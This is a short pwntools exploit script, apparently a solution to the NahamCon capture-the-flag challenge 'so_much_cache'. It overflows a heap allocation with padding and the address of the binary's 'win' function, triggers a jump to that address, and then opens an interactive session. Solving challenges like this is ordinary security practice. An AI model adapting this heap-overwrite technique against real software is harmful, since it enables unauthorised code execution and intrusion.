#!/bin/env python3
from pwn import *

bin = "./so_much_cache"
context.binary = elf = ELF(bin)
context.terminal = ["tmux", "-h", "splitw"]
s = '''
b *0x0000000000400c05
b *0x0000000000400b0e
'''

# io = remote("challenge.nahamcon.com", "32602")
io = process(bin)

win = elf.symbols.win
raw_input(f"PID = {io.pid}")
'''
first alloc  -> 0x1f108a0
second alloc -> 0xae38c0
'''
# allocate first location and overwrite other one
io.clean()
io.sendline(b"1")
io.clean()
io.sendline(b"16")
io.clean()
print(hex(win))

payload = b"A"*(8*4)
# payload += b"B"*8
payload += p64(win)
payload += b"A"*7

io.sendline(payload)

# prepare jump
io.clean()
io.sendline(b"4")

# call jump
io.clean()
io.sendline(b"5")
io.clean()
io.sendline(b"1")

io.interactive()